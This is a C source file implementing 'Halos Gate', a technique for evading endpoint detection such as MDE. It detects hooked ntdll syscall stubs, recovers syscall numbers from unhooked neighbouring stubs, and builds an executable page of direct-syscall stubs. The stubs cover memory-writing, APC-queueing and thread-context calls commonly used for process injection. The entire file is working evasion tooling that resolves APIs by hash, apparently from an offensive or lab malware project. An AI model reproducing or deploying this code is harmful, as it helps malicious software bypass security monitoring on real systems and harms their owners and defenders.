/*
 * halos.c — Halos Gate: evolved Hell's Gate with hook detection
 *
 * When MDE patches ntdll syscall stubs with jmp instructions, standard
 * Hell's Gate fails because the prologue no longer matches
 * 4C 8B D1 B8 XX 00 00 00.  Halos Gate handles this by:
 *
 * 1. Reading the target stub. If unhooked (matches pattern), use it directly.
 * 2. If hooked, walk to neighboring syscall stubs (SSN +/- 1, 2, 3 ...)
 *    until an unhooked one is found, clamped to ntdll's .text section (F14).
 * 3. Calculate the target SSN by offset from the unhooked neighbor.
 *
 * F4/F15: the main syscall path uses one persistent RX page carved into
 * per-SSN direct-syscall stubs (halos_invoke / halos_init) instead of
 * per-call stack-executed stubs.  Each slot holds a classic Hell's-Gate
 * stub with the SSN baked into the imm32 of `mov eax, <ssn>`, so the
 * RX page is immutable after init and no shared RW SSN cell exists.
 *
 * F16: the bootstrap no longer falls back to hardcoded SSN candidates;
 * if Halos Gate cannot resolve NtAllocateVirtualMemory it fails cleanly.
 */

#include "halos.h"
#include "peb.h"
#include "obfuscation.h"

#include <stdint.h>

/* SSN sentinel — no real syscall has this number */
#define SSN_INVALID 0xFFFFFFFF

/* Generic failure NTSTATUS (STATUS_UNSUCCESSFUL) */
#define HALOS_STATUS_FAILED ((LONG)0xC0000001)

/* ---- F4/F15: direct-syscall trampoline globals ----
 *
 * One RX page carved into HALOS_SLOT_COUNT fixed-size slots.  Slot i
 * holds an 11-byte Hell's-Gate stub with g_slot_ssns[i] baked into its
 * imm32; g_hash_table[i] names the syscall that slot answers for.
 * halos_invoke_hash / halos_invoke do a short linear scan and jump
 * straight into the slot.  The page is immutable after halos_init(). */
#define HALOS_SLOT_COUNT 13
#define HALOS_SLOT_LEN   16

static const DWORD g_hash_table[HALOS_SLOT_COUNT] = {
    HASH_NtAllocateVirtualMemory,
    HASH_NtWriteVirtualMemory,
    HASH_NtReadVirtualMemory,
    HASH_NtProtectVirtualMemory,
    HASH_NtFreeVirtualMemory,
    HASH_NtQueueApcThread,
    HASH_NtQueueApcThreadEx,
    HASH_NtSuspendThread,
    HASH_NtResumeThread,
    HASH_NtGetContextThread,
    HASH_NtSetContextThread,
    HASH_NtQueryInformationProcess,
    HASH_NtSetInformationThread,
};
static DWORD  g_slot_ssns[HALOS_SLOT_COUNT];
static LPVOID g_stubs = NULL;

/* Standard ntdll syscall stub prologue on Win10/11 x64:
 *   4C 8B D1          mov r10, rcx
 *   B8 XX 00 00 00    mov eax, <SSN>
 *   0F 05             syscall
 *   C3                ret
 *
 * When hooked by EDR, the first bytes are replaced with a jmp:
 *   E9 XX XX XX XX    jmp <hook>
 *   ... or ...
 *   48 B8 XX XX XX XX XX XX XX XX  movabs rax, <hook>
 *   FF E0                          jmp rax
 */

/* ---- Check if a stub is unhooked (matches standard prologue) ---- */
static BOOL is_unhooked(const uint8_t *stub)
{
    return stub[0] == 0x4C &&
           stub[1] == 0x8B &&
           stub[2] == 0xD1 &&
           stub[3] == 0xB8;
}

/* ---- Extract SSN from an unhooked stub ---- */
static DWORD extract_ssn(const uint8_t *stub)
{
    return (DWORD)stub[4] | ((DWORD)stub[5] << 8);
}

/* ---- F14: locate the ntdll .text section containing the syscall stubs ----
 *
 * Walks the PE section table from the NT headers to find the section that
 * contains `stub`.  Returns the [start, end) range of that section's mapped
 * image so the Halos neighbor walk can clamp itself and never touch
 * unmapped memory near the edges of ntdll's .text. */
static BOOL find_text_bounds(HMODULE ntdll, const uint8_t *stub,
                             const uint8_t **out_start,
                             const uint8_t **out_end)
{
    const uint8_t *base = (const uint8_t *)ntdll;
    if (!base || !stub) return FALSE;

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    /* The section table immediately follows the OptionalHeader. */
    IMAGE_SECTION_HEADER *sec = (IMAGE_SECTION_HEADER *)
        ((const uint8_t *)nt + sizeof(DWORD) /* Signature */
         + sizeof(IMAGE_FILE_HEADER)
         + nt->FileHeader.SizeOfOptionalHeader);

    DWORD rva_stub = (DWORD)(stub - base);
    WORD nsec = nt->FileHeader.NumberOfSections;

    for (WORD i = 0; i < nsec; i++) {
        DWORD va  = sec[i].VirtualAddress;
        DWORD vsz = sec[i].Misc.VirtualSize;
        DWORD rsz = sec[i].SizeOfRawData;
        DWORD sz  = vsz > rsz ? vsz : rsz;
        if (sz == 0) sz = rsz;          /* safety if VirtualSize is zero */
        if (rva_stub >= va && rva_stub < va + sz) {
            *out_start = base + va;
            *out_end   = base + va + sz;
            return TRUE;
        }
    }
    return FALSE;
}

/* ---- F14: clamped Halos Gate neighbor walk ----
 *
 * Resolves the SSN for a hooked stub by scanning neighbours at +/- 0x20.
 * The walk is bounded to the containing section's [start, end) range so it
 * never dereferences unmapped memory.  If a direction runs out of room it
 * stops that direction and the other direction (if any) is still tried. */
static DWORD halos_resolve_ssn_from_stub(HMODULE ntdll, const uint8_t *stub)
{
    /* Case 1: stub is unhooked — extract SSN directly */
    if (is_unhooked(stub))
        return extract_ssn(stub);

    /* Case 2: stub is hooked — walk neighbours within .text bounds */
    const uint8_t *text_start = NULL;
    const uint8_t *text_end   = NULL;
    BOOL have_bounds = find_text_bounds(ntdll, stub, &text_start, &text_end);

    /* Walk forward (higher addresses = higher SSNs), bounded to .text */
    if (have_bounds && stub < text_end) {
        for (int i = 1; i <= 500; i++) {
            const uint8_t *neighbor = stub + (i * 0x20);
            if (have_bounds && (neighbor < text_start || neighbor >= text_end))
                break;                  /* ran off the end of .text */
            if (is_unhooked(neighbor)) {
                DWORD neighbor_ssn = extract_ssn(neighbor);
                return neighbor_ssn - (DWORD)i;
            }
        }
    }

    /* Walk backward (lower addresses = lower SSNs), bounded to .text */
    if (have_bounds && stub > text_start) {
        for (int i = 1; i <= 500; i++) {
            const uint8_t *neighbor = stub - (i * 0x20);
            if (have_bounds && (neighbor < text_start || neighbor >= text_end))
                break;                  /* ran off the start of .text */
            if (is_unhooked(neighbor)) {
                DWORD neighbor_ssn = extract_ssn(neighbor);
                return neighbor_ssn + (DWORD)i;
            }
        }
    }

    return SSN_INVALID;
}

/* ---- Resolve SSN for a syscall function via PEB + Halos Gate ---- */
DWORD halos_get_ssn(const char *func_name)
{
    HMODULE ntdll = peb_get_ntdll();
    if (!ntdll) return SSN_INVALID;

    /* Resolve the function address via PEB export table walk */
    FARPROC addr = peb_resolve(func_name);
    if (!addr) return SSN_INVALID;

    return halos_resolve_ssn_from_stub(ntdll, (const uint8_t *)addr);
}

/* ---- Resolve SSN via precomputed DJB2 hash (no string needed) ---- */
DWORD halos_get_ssn_hash(DWORD name_hash)
{
    HMODULE ntdll = peb_get_ntdll();
    DBG_PRINTF("[halos] get_ssn_hash: hash=0x%08lx ntdll=%p\n",
               (unsigned long)name_hash, ntdll);
    if (!ntdll) return SSN_INVALID;

    FARPROC addr = peb_find_export(ntdll, name_hash);
    DBG_PRINTF("[halos] get_ssn_hash: addr=%p\n", addr);
    if (!addr) return SSN_INVALID;

    const uint8_t *stub = (const uint8_t *)addr;
    DBG_PRINTF("[halos] stub[0..7]=%02x %02x %02x %02x %02x %02x %02x %02x\n",
               stub[0], stub[1], stub[2], stub[3],
               stub[4], stub[5], stub[6], stub[7]);
    DWORD ssn = halos_resolve_ssn_from_stub(ntdll, stub);
    DBG_PRINTF("[halos] resolved SSN=0x%lx\n", (unsigned long)ssn);
    return ssn;
}

/* ====================================================================
 * F4/F15/F16: per-SSN direct-syscall cache + clean bootstrap
 * ====================================================================
 *
 * No stack-executed stubs on the success path.  halos_init() uses the
 * resolved NtAllocateVirtualMemory / NtProtectVirtualMemory ntdll
 * exports (already in RX memory) to allocate one RW page, emit one
 * per-SSN direct-syscall stub per hash into a slot inside it, and flip
 * the page RX.  Every subsequent syscall is a linear scan of the slot
 * table and a jump into the matching stub — SSN baked as imm32, no
 * shared RW cell, no per-call memory operations.  Legacy
 * halos_create_stub / halos_free_stub (below) remain as the error-path
 * fallback when init fails or an uncached SSN is requested.
 *
 * F16: if Halos Gate cannot resolve the NtAllocateVirtualMemory SSN the
 * bootstrap returns NULL cleanly instead of firing hardcoded bogus SSNs.
 */

/* Bootstrap stack stub (the ONE allowed stack-execution).
 *   4C 8B D1          mov r10, rcx
 *   B8 XX XX 00 00    mov eax, <ssn>
 *   0F 05             syscall
 *   C3                ret
 */
static LPVOID bootstrap_alloc(SIZE_T size)
{
    /* VM lab build: Win11 24H2 DEP + CET make stack-executed stubs crash.
     * Call ntdll's own NtAllocateVirtualMemory (already in an RX page) via
     * its resolved export address — same syscall, no stack exec. */
    HMODULE ntdll = peb_get_ntdll();
    if (!ntdll) return NULL;

    typedef LONG (NTAPI *NtAlloc_t)(HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    NtAlloc_t pNtAlloc = (NtAlloc_t)peb_find_export(ntdll, HASH_NtAllocateVirtualMemory);
    DBG_PRINTF("[halos] bootstrap_alloc: pNtAlloc=%p size=%zu\n", pNtAlloc, size);
    if (!pNtAlloc) return NULL;

    HANDLE proc   = (HANDLE)(-1);
    PVOID  base   = NULL;
    SIZE_T region = size;
    LONG status = pNtAlloc(proc, &base, 0, &region,
                           MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    DBG_PRINTF("[halos] bootstrap_alloc: status=0x%lx base=%p\n",
               (unsigned long)status, base);
    return (status == 0 && base) ? base : NULL;
}
/* Per-slot direct-syscall stub (classic Hell's-Gate shape):
 *
 *   4C 8B D1                mov r10, rcx            ; a1 -> r10 (NTAPI)
 *   B8 LL LL HH HH          mov eax, <ssn-imm32>    ; SSN baked in
 *   0F 05                   syscall
 *   C3                      ret
 *   90 90 90 90 90          pad to HALOS_SLOT_LEN
 *
 * The SSN is written once by halos_init() and never changes — no shared
 * RW cell, no hot-path writes to the code page. */
static void emit_direct_stub(uint8_t *out, DWORD ssn)
{
    out[0]  = 0x4C; out[1] = 0x8B; out[2] = 0xD1;         /* mov r10, rcx  */
    out[3]  = 0xB8;                                       /* mov eax, imm  */
    out[4]  = (uint8_t)(ssn >> 0);
    out[5]  = (uint8_t)(ssn >> 8);
    out[6]  = (uint8_t)(ssn >> 16);
    out[7]  = (uint8_t)(ssn >> 24);
    out[8]  = 0x0F; out[9]  = 0x05;                        /* syscall       */
    out[10] = 0xC3;                                        /* ret           */
    for (int i = 11; i < HALOS_SLOT_LEN; i++)
        out[i] = 0x90;                                     /* pad           */
}

/* ---- F4/F15: one-time setup of the per-SSN direct-syscall cache ----
 *
 * Idempotent: if g_stubs is already set, returns immediately.  Allocates
 * one RW page, resolves the SSN for each entry in g_hash_table (via
 * Halos Gate — handles hooked neighbours), emits a per-slot direct-
 * syscall stub into the page with the SSN baked into imm32, then flips
 * the page RW → RX.  On any failure it leaves g_stubs NULL so
 * halos_invoke / halos_invoke_hash fall back to the legacy per-call
 * halos_create_stub path. */
void halos_init(void)
{
    if (g_stubs) return;                  /* idempotent */

    SIZE_T code_size = 0x1000;
    LPVOID code_page = bootstrap_alloc(code_size);
    if (!code_page) return;

    /* Resolve + emit one stub per hash.  Unresolvable slots stay zeroed
     * and carry SSN_INVALID so the fast path skips them. */
    for (int i = 0; i < HALOS_SLOT_COUNT; i++) {
        DWORD ssn = halos_get_ssn_hash(g_hash_table[i]);
        g_slot_ssns[i] = ssn;
        if (ssn == SSN_INVALID) continue;
        emit_direct_stub((uint8_t *)code_page + i * HALOS_SLOT_LEN, ssn);
    }

    /* VM lab build: flip RW → RX by calling ntdll's NtProtectVirtualMemory
     * directly (stack stubs die under DEP/CET on Win11 24H2). */
    HMODULE ntdll_prot = peb_get_ntdll();
    if (!ntdll_prot) return;
    typedef LONG (NTAPI *NtProtect_t)(HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);
    NtProtect_t pNtProtect = (NtProtect_t)peb_find_export(ntdll_prot, HASH_NtProtectVirtualMemory);
    DBG_PRINTF("[halos] init: pNtProtect=%p\n", pNtProtect);
    if (!pNtProtect) return;

    HANDLE  proc       = (HANDLE)(-1);
    PVOID   baseAddr   = code_page;
    SIZE_T  regionSize = code_size;
    ULONG   oldProtect = 0;
    LONG status = pNtProtect(proc, &baseAddr, &regionSize,
                             PAGE_EXECUTE_READ, &oldProtect);
    DBG_PRINTF("[halos] init: NtProtect status=0x%lx\n", (unsigned long)status);
    if (status != 0) return;              /* code_page stays RW; fall back */

    /* Publication: set g_stubs last so no caller ever sees a half-
     * initialised cache.  On x86/x64 TSO plain stores are ordered. */
    g_stubs = code_page;
}

/* ---- F4/F15: invoke a syscall by raw SSN ----
 *
 * Scans the cached slot table for a stub matching `ssn` and tail-calls
 * it as a 6-argument NTAPI function (rcx=a1, rdx=a2, r8=a3, r9=a4;
 * a5/a6 go on the stack at [rsp+0x20] / [rsp+0x28]).  Falls back to the
 * legacy per-call halos_create_stub path when `ssn` is not in the cache
 * (init failed, or a caller resolved an SSN outside g_hash_table).
 * Returns the NTSTATUS. */
LONG halos_invoke(DWORD ssn, void *a1, void *a2, void *a3,
                  void *a4, void *a5, void *a6)
{
    if (ssn == SSN_INVALID) return HALOS_STATUS_FAILED;

    halos_init();

    typedef LONG (NTAPI *fn6_t)(PVOID, PVOID, PVOID, PVOID, PVOID, PVOID);

    if (g_stubs) {
        for (int i = 0; i < HALOS_SLOT_COUNT; i++) {
            if (g_slot_ssns[i] == ssn) {
                return ((fn6_t)((uint8_t *)g_stubs + i * HALOS_SLOT_LEN))
                    (a1, a2, a3, a4, a5, a6);
            }
        }
    }

    /* Legacy per-call stub (only when init failed or SSN not cached). */
    LPVOID stub = halos_create_stub(ssn);
    if (!stub) return HALOS_STATUS_FAILED;
    LONG st = ((fn6_t)stub)(a1, a2, a3, a4, a5, a6);
    halos_free_stub(stub);
    return st;
}

/* ---- Invoke a syscall by DJB2 hash ----
 *
 * Hot path: linear-scan the static hash table and call the matching slot
 * directly — no PEB walk, no SSN re-resolution.  Slow path (hash not in
 * the table, or init failed): fall back to the old resolve + per-call
 * stub route via halos_invoke. */
LONG halos_invoke_hash(DWORD name_hash, void *a1, void *a2, void *a3,
                       void *a4, void *a5, void *a6)
{
    halos_init();

    typedef LONG (NTAPI *fn6_t)(PVOID, PVOID, PVOID, PVOID, PVOID, PVOID);

    if (g_stubs) {
        for (int i = 0; i < HALOS_SLOT_COUNT; i++) {
            if (g_hash_table[i] == name_hash && g_slot_ssns[i] != SSN_INVALID) {
                return ((fn6_t)((uint8_t *)g_stubs + i * HALOS_SLOT_LEN))
                    (a1, a2, a3, a4, a5, a6);
            }
        }
    }

    DWORD ssn = halos_get_ssn_hash(name_hash);
    if (ssn == SSN_INVALID) return HALOS_STATUS_FAILED;
    return halos_invoke(ssn, a1, a2, a3, a4, a5, a6);
}


/* ---- Create a syscall stub in properly allocated memory (RW → RX) ----
 *
 * Legacy per-call path (antidebug.c).  The preferred path is halos_invoke,
 * which uses the persistent trampoline.  This allocates a small RW region
 * via the bootstrap, writes a 12-byte direct-syscall stub, and flips it to
 * RX.  Returns NULL cleanly if the protect SSN cannot be resolved. */
LPVOID halos_create_stub(DWORD ssn)
{
    if (ssn == SSN_INVALID) return NULL;

    uint8_t stub_bytes[] = {
        0x4C, 0x8B, 0xD1,              /* mov r10, rcx */
        0xB8, 0x00, 0x00, 0x00, 0x00,  /* mov eax, SSN */
        0x0F, 0x05,                    /* syscall */
        0xC3                           /* ret */
    };
    stub_bytes[4] = (uint8_t)(ssn & 0xFF);
    stub_bytes[5] = (uint8_t)((ssn >> 8) & 0xFF);

    /* Allocate via bootstrap (avoids VirtualAlloc) */
    LPVOID stub = bootstrap_alloc(sizeof(stub_bytes));
    if (!stub) return NULL;

    /* Write stub bytes (memory is RW from bootstrap_alloc) */
    memcpy(stub, stub_bytes, sizeof(stub_bytes));

    /* Protect to RX via a bootstrap protect stub */
    DWORD protect_ssn = halos_get_ssn_hash(HASH_NtProtectVirtualMemory);
    if (protect_ssn == SSN_INVALID) {
        /* N4: best-effort free via the trampoline/legacy path instead of
         * leaking the bootstrap-allocated RW page. If the free SSN is also
         * unresolvable the memory leaks (acceptable edge case — NtProtect
         * is always present in practice). */
        halos_free_stub(stub);
        return NULL;
    }

    uint8_t prot_stub[] = {
        0x4C, 0x8B, 0xD1,
        0xB8, 0x00, 0x00, 0x00, 0x00,
        0x0F, 0x05, 0xC3
    };
    prot_stub[4] = (uint8_t)(protect_ssn & 0xFF);
    prot_stub[5] = (uint8_t)((protect_ssn >> 8) & 0xFF);

    HANDLE  proc       = (HANDLE)(-1);
    PVOID   baseAddr   = stub;
    SIZE_T  regionSize = sizeof(stub_bytes);
    ULONG   oldProtect = 0;

    typedef LONG (NTAPI *NtProtect_t)(HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);
    ((NtProtect_t)prot_stub)(proc, &baseAddr, &regionSize,
                             PAGE_EXECUTE_READ, &oldProtect);

    return stub;
}

/* ---- Free a syscall stub (zero + free via direct syscall) ----
 *
 * Prefers the persistent trampoline (no stack execution); falls back to a
 * stack stub only when the trampoline is unavailable (init failed). */
void halos_free_stub(LPVOID stub)
{
    if (!stub) return;

    secure_zero(stub, 12);

    DWORD free_ssn = halos_get_ssn_hash(HASH_NtFreeVirtualMemory);
    if (free_ssn == SSN_INVALID) return;

    HANDLE  proc       = (HANDLE)(-1);
    PVOID   baseAddr   = stub;
    SIZE_T  regionSize = 0;
    typedef LONG (NTAPI *NtFree_t)(HANDLE, PVOID *, PSIZE_T, ULONG);

    /* Cached-slot path — reuse the baked NtFreeVirtualMemory stub. */
    if (g_stubs) {
        for (int i = 0; i < HALOS_SLOT_COUNT; i++) {
            if (g_hash_table[i] == HASH_NtFreeVirtualMemory &&
                g_slot_ssns[i] == free_ssn) {
                ((NtFree_t)((uint8_t *)g_stubs + i * HALOS_SLOT_LEN))
                    (proc, &baseAddr, &regionSize, MEM_RELEASE);
                return;
            }
        }
    }

    /* Legacy: stack stub free (only when trampoline init failed). */
    uint8_t free_stub[] = {
        0x4C, 0x8B, 0xD1,
        0xB8, 0x00, 0x00, 0x00, 0x00,
        0x0F, 0x05, 0xC3
    };
    free_stub[4] = (uint8_t)(free_ssn & 0xFF);
    free_stub[5] = (uint8_t)((free_ssn >> 8) & 0xFF);

    ((NtFree_t)free_stub)(proc, &baseAddr, &regionSize, MEM_RELEASE);
}